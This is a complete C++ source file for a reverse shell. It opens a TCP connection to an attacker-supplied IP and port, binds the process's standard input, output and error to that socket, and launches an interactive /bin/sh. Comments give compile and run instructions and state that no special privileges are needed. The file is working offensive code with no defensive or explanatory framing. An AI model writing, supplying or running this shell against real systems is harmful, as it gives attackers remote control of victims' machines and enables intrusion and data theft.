// Compile: g++ -o reverse_shell reverse_shell.cpp
// Run: ./reverse_shell <attacker_ip> <port>
// No special privileges required

#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

class ReverseShell {
public:
    void connect(const char* attackerIP, int port) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) return;
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = inet_addr(attackerIP);
        
        if (::connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
            return;
        }
        
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
        
        execl("/bin/sh", "sh", "-i", NULL);
        close(sock);
    }
};

int main(int argc, char* argv[]) {
    if (argc != 3) { std::cerr << "Usage: " << argv[0] << " <ip> <port>\n"; return 1; }
    ReverseShell shell;
    shell.connect(argv[1], atoi(argv[2]));
    return 0;
}